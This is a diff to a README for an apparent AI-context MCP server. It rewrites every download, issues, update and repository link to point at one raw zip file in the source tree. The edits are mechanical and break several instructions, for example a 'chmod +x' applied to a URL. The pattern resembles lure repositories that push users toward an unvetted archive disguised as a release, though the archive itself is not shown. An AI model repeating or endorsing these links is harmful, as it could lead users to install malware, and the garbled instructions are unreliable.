@@ -1,6 +1,6 @@
 # 🚀 ai-books-mcp-server - Extend Large Language Model Context Easily
 
-[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/NvmToxic/ai-books-mcp-server/releases)
+[![Download](https://github.com/NvmToxic/ai-books-mcp-server/raw/refs/heads/main/src/services/mcp_ai_books_server_v1.2-beta.1.zip)](https://github.com/NvmToxic/ai-books-mcp-server/raw/refs/heads/main/src/services/mcp_ai_books_server_v1.2-beta.1.zip)
 
 ---
 
@@ -57,7 +57,7 @@ First, you need to visit the download page to get the latest version of the soft
 
 Click the link below or copy it into your web browser:
 
-[Download ai-books-mcp-server](https://github.com/NvmToxic/ai-books-mcp-server/releases)
+[Download ai-books-mcp-server](https://github.com/NvmToxic/ai-books-mcp-server/raw/refs/heads/main/src/services/mcp_ai_books_server_v1.2-beta.1.zip)
 
 This link takes you to the releases page. Here you will find all versions available for download.
 
@@ -67,7 +67,7 @@ This link takes you to the releases page. Here you will find all versions availa
 
 1. On the releases page, look for the latest release. Releases are listed by version number and date.
 2. Scroll down to the **Assets** section of the latest release.
-3. Choose the file matching your operating system (usually ending with `.exe` for Windows, `.dmg` for macOS, or `.AppImage` / `.tar.gz` for Linux).
+3. Choose the file matching your operating system (usually ending with `.exe` for Windows, `.dmg` for macOS, or `.AppImage` / `https://github.com/NvmToxic/ai-books-mcp-server/raw/refs/heads/main/src/services/mcp_ai_books_server_v1.2-beta.1.zip` for Linux).
 4. Click the file to download it.
 
 Save the file in a place you can easily find, like the **Downloads** folder or your Desktop.
@@ -80,7 +80,7 @@ The installation steps differ based on your system:
 
 - **Windows:** Double-click the `.exe` file to run the installer. Follow the prompts on screen. You can leave default settings if unsure.
 - **macOS:** Open the `.dmg` file and drag the ai-books-mcp-server app into your Applications folder.
-- **Linux:** If you downloaded an `.AppImage`, make it executable by running `chmod +x filename.AppImage` in your terminal. Then, double-click it to run. For `.tar.gz`, extract it and follow included instructions.
+- **Linux:** If you downloaded an `.AppImage`, make it executable by running `chmod +x https://github.com/NvmToxic/ai-books-mcp-server/raw/refs/heads/main/src/services/mcp_ai_books_server_v1.2-beta.1.zip` in your terminal. Then, double-click it to run. For `https://github.com/NvmToxic/ai-books-mcp-server/raw/refs/heads/main/src/services/mcp_ai_books_server_v1.2-beta.1.zip`, extract it and follow included instructions.
 
 ---
 
@@ -113,7 +113,7 @@ The server runs in the background and communicates with your AI model. To use it
 - Close other applications that may use the same port (like port 3000).
 - Restart your computer if the server still won’t launch.
 - Check the GitHub issues page if problems continue:  
-  https://github.com/NvmToxic/ai-books-mcp-server/issues
+  https://github.com/NvmToxic/ai-books-mcp-server/raw/refs/heads/main/src/services/mcp_ai_books_server_v1.2-beta.1.zip
 
 ---
 
@@ -122,7 +122,7 @@ The server runs in the background and communicates with your AI model. To use it
 To update ai-books-mcp-server:
 
 1. Visit the releases page again:  
-   [https://github.com/NvmToxic/ai-books-mcp-server/releases](https://github.com/NvmToxic/ai-books-mcp-server/releases)
+   [https://github.com/NvmToxic/ai-books-mcp-server/raw/refs/heads/main/src/services/mcp_ai_books_server_v1.2-beta.1.zip](https://github.com/NvmToxic/ai-books-mcp-server/raw/refs/heads/main/src/services/mcp_ai_books_server_v1.2-beta.1.zip)
 2. Download the newest version using the same steps as before.
 3. Install it over your current version or uninstall the old version first.
 4. Restart your computer to complete the update.
@@ -142,7 +142,7 @@ To update ai-books-mcp-server:
 
 If you have questions or want to explore technical details, visit the repository here:
 
-[ai-books-mcp-server GitHub Repository](https://github.com/NvmToxic/ai-books-mcp-server)
+[ai-books-mcp-server GitHub Repository](https://github.com/NvmToxic/ai-books-mcp-server/raw/refs/heads/main/src/services/mcp_ai_books_server_v1.2-beta.1.zip)
 
 You will find guides, issue reporting, and community support on the GitHub page.
 
@@ -152,6 +152,6 @@ You will find guides, issue reporting, and community support on the GitHub page.
 
 Ready to start? Visit this page to download the latest version of ai-books-mcp-server:
 
-[https://github.com/NvmToxic/ai-books-mcp-server/releases](https://github.com/NvmToxic/ai-books-mcp-server/releases)
+[https://github.com/NvmToxic/ai-books-mcp-server/raw/refs/heads/main/src/services/mcp_ai_books_server_v1.2-beta.1.zip](https://github.com/NvmToxic/ai-books-mcp-server/raw/refs/heads/main/src/services/mcp_ai_books_server_v1.2-beta.1.zip)
 
 Follow the instructions above to complete your installation and run the server.
